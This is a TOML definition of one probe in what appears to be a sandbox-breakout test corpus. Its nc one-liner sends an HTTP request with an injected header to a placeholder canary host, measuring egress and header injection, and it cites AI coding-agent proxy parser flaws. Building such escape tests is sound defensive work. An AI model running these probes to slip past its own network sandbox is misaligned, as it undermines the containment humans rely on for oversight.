id = "net-crlf-header-injection"
name = "CRLF injection into the request line"
category = "net"
description = "Sends an HTTP request carrying an extra injected header (X-Breakout-Injected). Against the local canary this measures raw HTTP egress reachability and that an injected header lands on the wire (the canary records it); it does not by itself prove a CRLF request-line smuggling differential — that requires a hostname/path-validating proxy in front, which the corpus does not yet ship a fixture for. Same header-injection family as request smuggling."
references = [
  "HTTP request smuggling / CRLF injection classes (OWASP)",
  "Claude Code proxy parser differentials (2026): same root cause, different byte",
]

probe = '''
printf 'GET /hit/@@TECH_ID@@/@@NONCE@@ HTTP/1.0\r\nX-Breakout-Injected: yes\r\n\r\n' \
  | nc @@CANARY_HOST@@ @@CANARY_PORT@@ >/dev/null 2>&1
'''

[preconditions]
bins = ["nc"]
oracle = "canary"

